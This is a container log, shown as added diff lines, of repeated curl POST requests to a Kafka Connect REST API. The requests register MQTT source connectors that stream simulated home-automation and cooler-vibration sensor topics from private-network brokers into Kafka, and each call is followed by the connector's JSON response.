+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  39357  35142 --:--:-- --:--:-- --:--:-- 74500
+{"name":"source-mqtt13_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-14","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt13_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt14_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-15", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  34437  30750 --:--:-- --:--:-- --:--:-- 65187
+{"name":"source-mqtt14_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-15","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt14_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt15_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-16", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  29000  25894 --:--:-- --:--:-- --:--:-- 54894
+{"name":"source-mqtt15_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-16","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt15_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt16_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-17", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{"name":"source-mqtt16_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-17","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt16_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}100  1043  100   551  100   492  14891  13297 --:--:-- --:--:-- --:--:-- 28189
+[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt17_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-18", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  42384  37846 --:--:-- --:--:-- --:--:-- 80230
+{"name":"source-mqtt17_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-18","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt17_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt18_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-19", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  39357  35142 --:--:-- --:--:-- --:--:-- 74500
+{"name":"source-mqtt18_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-19","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt18_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt19_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-20", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  39357  35142 --:--:-- --:--:-- --:--:-- 74500
+{"name":"source-mqtt19_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-20","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt19_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt20_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-21", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  45916  41000 --:--:-- --:--:-- --:--:-- 86916
+{"name":"source-mqtt20_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-21","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt20_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt21_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-22", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{"name":"source-mqtt21_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-22","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt21_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}100  1043  100   551  100   492  39357  35142 --:--:-- --:--:-- --:--:-- 74500
+[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt22_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-23", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  39357  35142 --:--:-- --:--:-- --:--:-- 74500
+{"name":"source-mqtt22_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-23","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt22_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt23_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-24", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  42384  37846 --:--:-- --:--:-- --:--:-- 80230
+{"name":"source-mqtt23_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-24","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt23_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt24_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-25", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  34437  30750 --:--:-- --:--:-- --:--:-- 65187
+{"name":"source-mqtt24_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-25","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt24_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt25_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-26", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  42384  37846 --:--:-- --:--:-- --:--:-- 80230
+{"name":"source-mqtt25_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-26","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt25_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt26_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-27", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  39357  35142 --:--:-- --:--:-- --:--:-- 74500
+{"name":"source-mqtt26_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-27","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt26_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt27_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-28", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  45916  41000 --:--:-- --:--:-- --:--:-- 86916
+{"name":"source-mqtt27_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-28","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt27_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt28_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-29", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  39357  35142 --:--:-- --:--:-- --:--:-- 74500
+{"name":"source-mqtt28_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-29","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt28_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt29_2024_03_11_10_57_42_907366", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.2.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-30", "connect.mqtt.username": "placeholder", "connect.mqtt.password": "placeholder"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1043  100   551  100   492  45916  41000 --:--:-- --:--:-- --:--:-- 86916
+{"name":"source-mqtt29_2024_03_11_10_57_42_907366","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.2.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM domotic/iotsim-domotic-monitor-bis-30","connect.mqtt.username":"placeholder","connect.mqtt.password":"placeholder","name":"source-mqtt29_2024_03_11_10_57_42_907366"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt0_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-1", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1026  100   542  100   484  33875  30250 --:--:-- --:--:-- --:--:-- 64125
+{"name":"source-mqtt0_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-1","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt0_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt1_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-2", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{"name":"source-mqtt1_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-2","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt1_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}100  1026  100   542  100   484  41692  37230 --:--:-- --:--:-- --:--:-- 78923
+[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt2_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-3", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1026  100   542  100   484  49272  44000 --:--:-- --:--:-- --:--:-- 93272
+{"name":"source-mqtt2_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-3","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt2_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt3_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-4", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{"name":"source-mqtt3_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-4","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt3_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}100  1026  100   542  100   484  41692  37230 --:--:-- --:--:-- --:--:-- 78923
+[0m
